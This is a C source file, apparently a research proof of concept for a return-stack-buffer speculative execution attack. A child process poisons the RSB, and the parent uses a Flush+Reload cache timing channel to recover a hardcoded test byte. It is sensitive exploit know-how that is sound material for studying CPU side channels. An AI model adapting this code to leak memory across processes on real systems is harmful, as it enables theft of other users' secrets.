#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
// // 
// #include "a.h"

size_t CACHE_MISS = 300;

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}


void foo(void){
    printf("foo\n");
}


extern void do_nothing();
extern void do_something();
extern void  train_rsb();
extern uint8_t gadget();

extern char probe_array[256 * 4096];


void __attribute__((noinline)) wrong_return() {
  usleep(100000);
  return;
}


// Pop the return address from the software stack, causing misspeculation
void __attribute__((noinline)) pollute_rsb() {
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  asm("jmp return_label");
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
  asm("b return_label");
#endif
}

int main(){


    // write probe_array to avoid page fault
    for(int i = 0; i < 256; i++){
        probe_array[i * 4096] = 1;
    }

    // check the address of gadget
    printf("gadget: %p\n", gadget);
 
    pid_t is_child = fork();

    if(is_child == 0){
        while(1){
            // train_rsb();
            asm volatile("return_label:");
            pollute_rsb();
            asm volatile("\n\
                lea probe_array, %r8\n\
                mov $0x6f, %rax\n\
                shl $12, %rax\n\
                mov (%r8, %rax, 1), %r9\n\
            ");
            
            maccess(0);
        }
    }else{
        while(1){
            int results[256] = {0};
            for(int try = 0; try < 10; ++try){
                for (size_t i = 0; i < 256; i++) {
                    size_t mix_i = ((i * 167) + 13) & 255;
                    flush(&probe_array[mix_i * 4096]);
                }

                mfence();
                // asm volatile("mov $0xfd, %%rax\n" : : : "rax");
                wrong_return();
                // do_nothing();
                // train_rsb();
                // int c = train_rsb();

                for (size_t i = 0; i < 256; i++) {
                    size_t mix_i = ((i * 167) + 13) & 255;
                    uint64_t t1 = rdtsc();
                    maccess(&probe_array[mix_i * 4096]);
                    uint64_t t2 = rdtsc() - t1;
                    if (t2 < CACHE_MISS) {
                        results[mix_i]++;
                        // printf("hit: %#lx\n", mix_i);
                    }
                }
                
                // sched_yield();

                // printf("return from rsb: %#x\n", c);
            
            }


            // find max
            int max = 0;
            int idx = 0;
            for(int i = 0; i < 256; ++i){
                if(results[i] > max){
                    max = results[i];
                    idx = i;
                }
            }

            printf("idx: %x score: %d, target idx: %x target score: %d        %s\n", idx, results[idx], 0x6f, results[0x6f], idx == 0x6f ? "yes" : "");

            sched_yield();
        }
    }


    // constantly train the RSB, every time the RSB is trained, sched is called
    // int cnt = 100;
    // while(cnt--){


    //     train_rsb();
    //     sched_yield();
    // }
    

    return 0;
}


